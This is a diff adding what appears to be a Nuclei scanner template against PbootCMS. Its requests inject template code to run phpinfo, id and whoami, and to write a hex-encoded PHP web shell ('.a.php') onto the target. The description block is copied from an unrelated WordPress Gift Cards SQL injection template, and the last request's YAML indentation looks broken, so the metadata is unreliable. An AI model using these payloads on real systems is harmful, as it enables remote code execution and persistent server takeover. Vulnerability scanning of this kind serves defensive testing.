@@ -1,0 +1,72 @@
+id: PbootCMS-getshell
+
+info:
+  name: PbootCMS-getshell
+  author: xxcdd
+  severity: critical
+  description: |
+    The Gift Cards (Gift Vouchers and Packages) WordPress Plugin, version <= 4.3.1, is affected by an unauthenticated SQL injection vulnerability in the template parameter in the wpgv_doajax_voucher_pdf_save_func action.
+  impact: |
+    Successful exploitation of this vulnerability could allow an attacker to perform SQL injection attacks, potentially leading to unauthorized access, data leakage, or further compromise of the WordPress site.
+  remediation: |
+    Update the Gift Cards (Gift Vouchers and Packages) WordPress Plugin to the latest version available.
+  reference:
+    - https://www.anquanke.com/post/id/167138#h3-3
+  metadata:
+    fofa-query: app="PbootCMS"
+  tags: PbootCMS
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo"
+      - "{{BaseURL}}/index.php/Content/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo"
+      - "{{BaseURL}}/PbootCMS/index.php/List/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo"
+      - "{{BaseURL}}/PbootCMS/index.php/About/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo"  
+      - "{{BaseURL}}/index.php/Search/index?keyword={pboot:if(1)$a=$_GET[title];$a();//)})}}{/pboot:if}&title=phpinfo"  
+    headers:
+        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body, 'Root')
+          - contains(body, 'System')
+        condition: or
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id"
+      - "{{BaseURL}}/PbootCMS/index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id"
+      - "{{BaseURL}}/?member/login/?a=}{pboot:if((get_lg/*aaa-*/())/**/(\"whoami\"))}{/pboot:if}"
+      - "{{BaseURL}}/PbootCMS/?member/login/?a=}{pboot:if((get_lg/*aaa-*/())/**/(\"whoami\"))}{/pboot:if}"
+      - "{{BaseURL}}/index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id"
+      - "{{BaseURL}}/PbootCMS/index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id"
+      - "{{BaseURL}}/index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id"
+      - "{{BaseURL}}/index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id"
+      - "{{BaseURL}}/PbootCMS/index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id"
+    headers:
+        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body, 'uid=')
+          - contains(body, 'gid=')
+          - contains(body, 'root')
+          - contains(body, 'Admin')
+          - contains(body, 'admin')
+        condition: or
+  - method: GET
+      path:
+        - "{{BaseURL}}//?member/login/aaaaaa}{pboot:if(true);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/test1;use/**/function/**/get/**/as/**/test3;use/**/function/**/hex2bin/**/as/**/test4;test(test1(test3('file'),'w'),test4(test3('content')));if(true)}{/pboot:if}&file=.a.php&content=3c3f7068702073797374656d28245f524551554553545b2761275d293b3f3e"
+        - "{{BaseURL}}/PbootCMS//?member/login/aaaaaa}{pboot:if(true);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/test1;use/**/function/**/get/**/as/**/test3;use/**/function/**/hex2bin/**/as/**/test4;test(test1(test3('file'),'w'),test4(test3('content')));if(true)}{/pboot:if}&file=.a.php&content=3c3f7068702073797374656d28245f524551554553545b2761275d293b3f3e"
+      headers:
+          User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+          
+      matchers:
+        - type: dsl
+          dsl:
+            - 'status_code_1==200'
+            - 'status_code_1==500'
+          condition: or
